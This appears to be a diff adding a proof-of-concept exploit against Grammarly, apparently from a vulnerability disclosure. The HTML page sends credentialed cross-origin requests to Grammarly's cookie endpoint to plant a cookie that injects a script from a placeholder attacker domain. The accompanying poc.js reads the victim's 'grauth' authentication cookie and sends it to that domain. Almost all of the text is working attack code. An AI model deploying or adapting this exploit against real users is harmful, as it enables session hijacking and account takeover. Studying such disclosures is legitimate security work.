@@ -1,0 +1,47 @@
+<html>
+
+<head>
+<title>Grammarly POC</title>
+<meta charset="utf-8"/>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</head>
+
+<body>
+<script>
+
+    var cookie_hax = {
+        "gnar_containerId":"</noscript><script/src='https://<YOUR_DOMAIN_NAME>/poc.js'></scr"+"ipt><noscript>",
+    };
+
+    for (var name in cookie_hax) {
+        $.ajax({
+            type: "POST",
+            url: "https://gnar.grammarly.com/cookies?name=" + name + "&value=" + encodeURIComponent(cookie_hax[name]) + "&maxAge=2147483647",
+            cache: false,
+            xhrFields: {
+                withCredentials: true
+            },
+            crossDomain: true,
+            async: false,
+        });
+    }
+
+    window.location.replace("https://www.grammarly.com/upgrade?utm_source=upHook&app_type=app&page=free&utm_campaign=editorMenu&utm_medium=internal");
+
+</script>
+</body>
+
+</html>
+
+
+################poc.js####################
+
+
+var xhr = new XMLHttpRequest();
+xhr.open('GET', "https://gnar.grammarly.com/cookies?name=grauth");
+xhr.withCredentials = true;
+xhr.onload = function () {
+    this.open('GET', "https://<YOUR_DOMAIN_NAME>/" + this.response);
+    this.send();
+};
+xhr.send();
